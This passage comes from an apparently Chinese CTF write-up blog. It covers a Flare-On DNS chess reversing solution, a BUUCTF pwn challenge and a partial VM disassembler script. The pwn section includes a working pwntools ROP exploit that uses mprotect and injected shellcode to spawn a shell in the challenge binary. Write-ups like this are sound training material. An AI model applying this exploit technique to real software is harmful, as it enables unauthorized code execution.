class="line">knight-d2-c4.game-of-thrones.flare-on.com</span><br><span class="line">knight-d2-c4.game-of-thrones.flare-on.com 127.168.171.31 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-c6-c7.game-of-thrones.flare-on.com</span><br><span class="line">pawn-c6-c7.game-of-thrones.flare-on.com 127.148.37.223 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-f4-g3.game-of-thrones.flare-on.com</span><br><span class="line">bishop-f4-g3.game-of-thrones.flare-on.com 127.108.24.10 ns1.game-of-thrones.flare-on.com</span><br><span class="line">rook-d3-e3.game-of-thrones.flare-on.com</span><br><span class="line">rook-d3-e3.game-of-thrones.flare-on.com 127.37.251.13 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-e4-e5.game-of-thrones.flare-on.com</span><br><span class="line">pawn-e4-e5.game-of-thrones.flare-on.com 127.34.217.88 ns1.game-of-thrones.flare-on.com</span><br><span class="line">queen-a8-g2.game-of-thrones.flare-on.com</span><br><span class="line">queen-a8-g2.game-of-thrones.flare-on.com 127.57.238.51 ns1.game-of-thrones.flare-on.com</span><br><span class="line">queen-a3-b4.game-of-thrones.flare-on.com</span><br><span class="line">queen-a3-b4.game-of-thrones.flare-on.com 127.196.103.147 ns1.game-of-thrones.flare-on.com</span><br><span class="line">queen-h5-f7.game-of-thrones.flare-on.com</span><br><span class="line">queen-h5-f7.game-of-thrones.flare-on.com 127.141.14.174 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-h4-h5.game-of-thrones.flare-on.com</span><br><span class="line">pawn-h4-h5.game-of-thrones.flare-on.com 127.238.7.163 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-e2-f3.game-of-thrones.flare-on.com</span><br><span class="line">bishop-e2-f3.game-of-thrones.flare-on.com 127.230.231.104 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-g2-g3.game-of-thrones.flare-on.com</span><br><span class="line">pawn-g2-g3.game-of-thrones.flare-on.com 127.55.220.79 ns1.game-of-thrones.flare-on.com</span><br><span class="line">knight-h8-g6.game-of-thrones.flare-on.com</span><br><span class="line">knight-h8-g6.game-of-thrones.flare-on.com 127.184.171.45 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-b3-f7.game-of-thrones.flare-on.com</span><br><span class="line">bishop-b3-f7.game-of-thrones.flare-on.com 127.196.146.199 ns1.game-of-thrones.flare-on.com</span><br><span class="line">queen-d1-d6.game-of-thrones.flare-on.com</span><br><span class="line">queen-d1-d6.game-of-thrones.flare-on.com 127.191.78.251 ns1.game-of-thrones.flare-on.com</span><br><span class="line">knight-b1-c3.game-of-thrones.flare-on.com</span><br><span class="line">knight-b1-c3.game-of-thrones.flare-on.com 127.159.162.42 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-f1-d3.game-of-thrones.flare-on.com</span><br><span class="line">bishop-f1-d3.game-of-thrones.flare-on.com 127.184.48.79 ns1.game-of-thrones.flare-on.com</span><br><span class="line">rook-b4-h4.game-of-thrones.flare-on.com</span><br><span class="line">rook-b4-h4.game-of-thrones.flare-on.com 127.127.29.123 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-c1-a3.game-of-thrones.flare-on.com</span><br><span class="line">bishop-c1-a3.game-of-thrones.flare-on.com 127.191.34.35 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-e8-b5.game-of-thrones.flare-on.com</span><br><span class="line">bishop-e8-b5.game-of-thrones.flare-on.com 127.5.22.189 ns1.game-of-thrones.flare-on.com</span><br><span class="line">rook-f2-f3.game-of-thrones.flare-on.com</span><br><span class="line">rook-f2-f3.game-of-thrones.flare-on.com 127.233.141.55 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-a2-a4.game-of-thrones.flare-on.com</span><br><span class="line">pawn-a2-a4.game-of-thrones.flare-on.com 127.55.250.81 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-d2-d4.game-of-thrones.flare-on.com</span><br><span class="line">pawn-d2-d4.game-of-thrones.flare-on.com 127.53.176.56 ns1.game-of-thrones.flare-on.com</span><br></pre></td></tr></table></figure>
<p>要改一下hosts，以便和他下棋</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">s = [<span class="string">&quot;A fine opening&quot;</span>,<span class="string">&quot;Still within book&quot;</span>,<span class="string">&quot;Interesting gambit&quot;</span>,<span class="string">&quot;I must find counterplay&quot;</span>,<span class="string">&quot;That&#x27;s risky...&quot;</span>,<span class="string">&quot;Good development, but I control the center&quot;</span>,<span class="string">&quot;A respectable sacrifice&quot;</span>,<span class="string">&quot;I am blockaded, but have an escape&quot;</span>,<span class="string">&quot;Careful! Mind your defense&quot;</span>,<span class="string">&quot;I have gained a tempo&quot;</span>,<span class="string">&quot;You have weak squares around your king&quot;</span>,<span class="string">&quot;With my next move I will seize control&quot;</span>,<span class="string">&quot;An exchange of pieces is in order&quot;</span>,<span class="string">&quot;A bold move&quot;</span>,<span class="string">&quot;byte_&quot;</span>]</span><br><span class="line">a = [<span class="number">0xbc</span>, <span class="number">0xec</span>, <span class="number">0xd3</span>, <span class="number">0xdf</span>, <span class="number">0xdd</span>, <span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0xb6</span>, <span class="number">0xac</span>, <span class="number">0x15</span>, <span class="number">0x36</span>, <span class="number">0x85</span>, <span class="number">0x8d</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x77</span>, <span class="number">0x52</span>, <span class="number">0x4d</span>, <span class="number">0x71</span>, <span class="number">0x54</span>, <span class="number">0x7d</span>, <span class="number">0xa7</span>, <span class="number">0xa7</span>, <span class="number">0x8</span>, <span class="number">0x16</span>, <span class="number">0xfd</span>, <span class="number">0xd7</span>]</span><br><span class="line">seq = [<span class="number">0</span>]*<span class="number">15</span></span><br><span class="line">b = [<span class="number">0</span>]*len(a)</span><br><span class="line">print(len(a))</span><br><span class="line">lines = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(lines),<span class="number">2</span>):</span><br><span class="line">    li = lines[i+<span class="number">1</span>]</span><br><span class="line">    li = li.split(<span class="string">&#x27; &#x27;</span>,<span class="number">-1</span>)</span><br><span class="line">    domain = li[<span class="number">0</span>]</span><br><span class="line">    ip = li[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print(ip,domain)</span></span><br><span class="line">    ip = ip.split(<span class="string">&#x27;.&#x27;</span>,<span class="number">-1</span>)</span><br><span class="line">    a1 = int(ip[<span class="number">2</span>])&amp;<span class="number">0xf</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> int(ip[<span class="number">3</span>])&amp;<span class="number">1</span>:</span><br><span class="line">        seq[int(ip[<span class="number">2</span>])&amp;<span class="number">0xf</span>]=domain</span><br><span class="line">        print(domain)</span><br><span class="line">        b[a1]=a[a1]^int(ip[<span class="number">1</span>])</span><br><span class="line">        b[a1+<span class="number">1</span>]=a[a1+<span class="number">1</span>]^int(ip[<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># print(a1)</span></span><br><span class="line">        <span class="comment"># print(s[a1])</span></span><br><span class="line">    </span><br><span class="line">print(seq)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seq:</span><br><span class="line">    print(i)</span><br><span class="line">print(bytes(b))</span><br></pre></td></tr></table></figure>
<p>基本逻辑逆到了，但是顺序没有注意到</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://kawing-ho.github.io/2019/flareon-dnschess/">https://kawing-ho.github.io/2019/flareon-dnschess/</a></p>
<h2 id="pwn-get-started-3dsctf-2016"><a href="#pwn-get-started-3dsctf-2016" class="headerlink" title="[pwn]get_started_3dsctf_2016"></a>[pwn]get_started_3dsctf_2016</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>程序中有get_flag函数，可以构造栈空间，但是pwntools打不过去，调试也调试不得</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib32/libc.so.6&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28160)</span></span><br><span class="line">p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line"></span><br><span class="line">getflag = <span class="number">0x80489a0</span></span><br><span class="line">arg1 = <span class="number">0x308CD64F</span></span><br><span class="line">arg2 = <span class="number">0x195719D1</span></span><br><span class="line">exita = <span class="number">0x804E6A0</span></span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27;*0x38+&#x27;a&#x27;*4+p32(getflag)+p32(exita)+p32(arg1)+p32(arg2)</span></span><br><span class="line"><span class="comment"># # p.recvuntil(&#x27;magica&#x27;)</span></span><br><span class="line"><span class="comment"># # p.recv()</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     p.send(&#x27;\xff&#x27;)</span></span><br><span class="line"><span class="comment"># p.sendline(&#x27;\x00&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p>使用mprotect函数，修改bss段，然后写入shellcode，getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib32/libc.so.6&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28160)</span></span><br><span class="line">p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line"></span><br><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"><span class="comment"># bss段起始地址</span></span><br><span class="line">bss = <span class="number">0x080EB000</span></span><br><span class="line"><span class="comment"># bss 段长度</span></span><br><span class="line">bssLen = <span class="number">0x1000</span></span><br><span class="line"><span class="comment"># 为了栈平衡，由于mprotect调用了3个参数，需要将三个参数出栈，这样也容易构造ROP链的后续部分</span></span><br><span class="line">pop3 = <span class="number">0x804951d</span></span><br><span class="line">read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect部分 权限rwx 7</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(mprotect)+p32(pop3)+p32(bss)+p32(bssLen)+p32(<span class="number">7</span>)+p32(read)</span><br><span class="line"><span class="comment"># read 部分</span></span><br><span class="line">payload+=p32(pop3)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">0x100</span>)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>感想</p>
<p>payload一次性完成了，我的payload多次跳转，存在不确定性；另外可以通过ROP链维护栈平衡</p>
<p>参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lyxf/p/12113401.html">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>
<h2 id="rev-XMAN2018排位赛-easyvm"><a href="#rev-XMAN2018排位赛-easyvm" class="headerlink" title="[rev][XMAN2018排位赛]easyvm"></a>[rev][XMAN2018排位赛]easyvm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">ops = [<span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0x13</span>,</span><br><span class="line"> <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, </span><br><span class="line"> <span class="number">0x0</span>, <span class="number">0x13</span>, <span class="number">0x4</span>, <span class="number">0x4</span>, </span><br><span class="line"> <span class="number">0x28</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x33</span>, </span><br><span class="line"> <span class="number">0x14</span>, <span class="number">0x0</span>, <span class="number">0x20</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x11</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x1b</span>, <span class="number">0x5</span>, <span class="number">0x4</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x24</span>, <span class="number">0x3</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xe0</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x18</span>, <span class="number">0x0</span>, <span class="number">0xe0</span>, <span class="number">0x1e</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x13</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x28</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x18</span>, <span class="number">0x0</span>, <span class="number">0x1f</span>, <span class="number">0x20</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x1b</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xe0</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x18</span>, <span class="number">0x0</span>, <span class="number">0xe0</span>, <span class="number">0x1e</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x1d</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1b</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x24</span>, <span class="number">0x3</span>, <span class="number">0x1f</span>, <span class="number">0x28</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x18</span>, <span class="number">0x0</span>, <span class="number">0x1f</span>, <span class="number">0x20</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0x1b</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x13</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x28</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xe0</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x1b</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x1d</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0x13</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1b</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0x22</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x24</span>, <span class="number">0x3</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x13</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x13</span>, <span class="number">0x4</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0xc</span>, <span class="number">0x28</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x11</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x1b</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xdf</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0x1d</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x1b</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x27</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x17</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x24</span>, <span class="number">0x3</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x2a</span>]</span><br><span class="line">ip = <span class="number">0</span></span><br><span class="line">l = len(ops)</span><br><span class="line">last = <span class="number">0</span></span><br><span class="line">reg = [<span class="string">&#x27;&#x27;</span>]*<span class="number">14</span></span><br><span class="line">reg[<span class="number">13</span>]=<span class="string">&#x27;0xEFBEADDE&#x27;</span></span><br><span class="line">reg[<span class="number">11</span>]=<span class="string">&#x27;input&#x27;</span></span><br><span class="line">reg[<span class="number">12</span>]=<span class="string">&#x27;unk_3e75&#x27;</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="string">&#x27;stack&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ip&lt;l:</span><br><span class="line">    op1=<span class="number">88888888</span></span><br><span class="line">    op2=<span class="number">88888888</span></span><br><span class="line">    <span class="keyword">if</span>(ip+<span class="number">1</span>&lt;l):op1 = ops[ip+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span>(ip+<span class="number">2</span>&lt;l):op2 = ops[ip+<span class="number">2</span>]</span><br><span class="line">    op = ops[ip]&amp;<span class="number">0xfe</span></span><br><span class="line">    off = ops[ip]&amp;<span class="number">1</span></span><br><span class="line">    print(<span class="string">&quot;%02x:%02x:&quot;</span>%(ip,op),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> op==<span class="number">0</span>:</span><br><span class="line">        s=<span class="string">&#x27;mov8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;mov8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">2</span>:</span><br><span class="line">        s=<span class="string">&#x27;mov32 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;mov32 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;lea8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">            ip+=<span class="number">2</span></span><br><span class="line">        ip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;lea32 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        </span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;ldr32 reg[%d],reg[%d];reg[1]=*reg[a2]&#x27;</span>%(op1,op2)</span><br><span class="line">        </span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;ldr8 